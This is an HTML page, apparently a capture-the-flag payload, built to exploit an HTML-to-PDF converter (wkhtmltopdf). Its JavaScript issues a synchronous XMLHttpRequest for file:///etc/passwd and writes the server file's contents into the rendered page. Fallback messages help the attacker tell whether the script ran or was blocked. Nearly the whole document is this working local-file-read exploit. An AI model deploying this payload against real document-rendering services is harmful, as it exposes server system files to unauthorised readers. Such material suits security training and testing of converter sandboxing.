<!DOCTYPE html>
<html>
<head>
    <title>CTF File Leak (JS Only)</title>
    <style>
        body { font-family: sans-serif; margin: 20px; background-color: #282c34; color: #abb2bf; }
        h1 { color: #61afef; }
        pre { background-color: #3e4451; padding: 15px; border: 1px solid #5c6370; white-space: pre-wrap; word-wrap: break-word; font-size: 1.1em; color: #98c379; }
        .info-box { background-color: #3e4451; border-left: 4px solid #c678dd; padding: 10px; margin-top: 20px; color: #e06c75; }
    </style>
</head>
<body>
    <h1>Attempting to Leak /etc/passwd via JavaScript XMLHttpRequest:</h1>
    <p>This page tries to read the content of /etc/passwd using the provided JavaScript code and display it below.</p>

    <pre id="fileContent">
        Loading... If nothing appears here, the JavaScript might be blocked, or file access failed.
    </pre>

    <script>
        try {
            var x = new XMLHttpRequest();
            // Open a synchronous GET request to the local file system
            x.open('GET', 'file:///etc/passwd', false); // 'false' means synchronous
            x.send(); // Send the request

            // Check if the request was successful
            // Status 200 is for HTTP, Status 0 is common for local file:/// requests in some contexts
            if (x.status === 200 || x.status === 0) {
                document.getElementById('fileContent').textContent = x.responseText;
            } else {
                // If the request fails, show the status code and text
                document.getElementById('fileContent').textContent = 'Error fetching file: Status ' + x.status + ' - ' + x.statusText + '. This indicates a possible security restriction or file not found.';
            }
        } catch (e) {
            // Catch any JavaScript errors during execution
            document.getElementById('fileContent').textContent = 'JavaScript Execution Error: ' + e.message + '\n\n' + 'This typically means the browser (wkhtmltopdf) blocked the script or the file access for security reasons.';
        }
    </script>

    <div class="info-box">
        If you see "Loading..." or an error message here, it indicates that the JavaScript code ran, but the file was not accessible or the request was blocked by security policies. If the PDF is completely blank or shows an unrelated error, it means this HTML itself was not processed.
    </div>

</body>
</html>
